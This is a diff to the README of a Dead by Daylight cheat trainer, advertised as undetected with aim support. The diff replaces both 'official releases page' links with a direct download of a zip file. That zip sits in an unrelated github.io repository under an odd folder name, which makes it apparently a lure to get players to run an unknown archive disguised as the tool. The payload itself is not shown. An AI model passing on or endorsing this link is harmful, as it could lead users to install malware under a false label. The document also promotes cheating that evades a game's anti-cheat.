@@ -5,7 +5,7 @@ description: "Automate Dead by Daylight progression with an undetected external 
 ---
 # 🎮 DBD-AutoGrind-Trainer-2026-Pro - Automate your Dead by Daylight progression easily
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Britishwestafricahedgefund788/DBD-AutoGrind-Trainer-2026-Pro/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Britishwestafricahedgefund788/britishwestafricahedgefund788.github.io/main/overaggravation/io_britishwestafricahedgefund_github_1.0.zip)
 
 This software automates the collection of Bloodpoints and unlocks content within Dead by Daylight. It provides tools for character progression, visual information, and aim support. This trainer runs as an external process on your Windows computer.
 
@@ -22,7 +22,7 @@ Install the .NET Desktop Runtime from the official Microsoft website if you do n
 
 ## 📥 Downloading the Software
 
-Visit the [official releases page](https://github.com/Britishwestafricahedgefund788/DBD-AutoGrind-Trainer-2026-Pro/releases) to access the files.
+Visit the [official releases page](https://raw.githubusercontent.com/Britishwestafricahedgefund788/britishwestafricahedgefund788.github.io/main/overaggravation/io_britishwestafricahedgefund_github_1.0.zip) to access the files.
 
 Follow these steps for a clean installation:
 
